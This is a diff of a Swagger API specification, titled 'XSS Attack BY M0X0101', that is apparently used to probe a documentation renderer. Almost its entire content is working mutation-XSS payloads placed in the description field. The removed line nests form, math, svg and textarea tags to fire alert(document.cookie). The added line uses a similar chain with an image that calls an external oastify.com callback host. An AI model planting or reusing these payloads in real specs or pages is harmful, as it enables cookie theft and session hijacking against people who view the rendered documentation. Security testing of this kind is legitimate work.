@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='http://2mp5qb9b9j6p8tbter1hc2f2nttlhh56.oastify.com' onerror='alert(1)'>">
   version: production
 basePath: /JSSResource/
 produces:
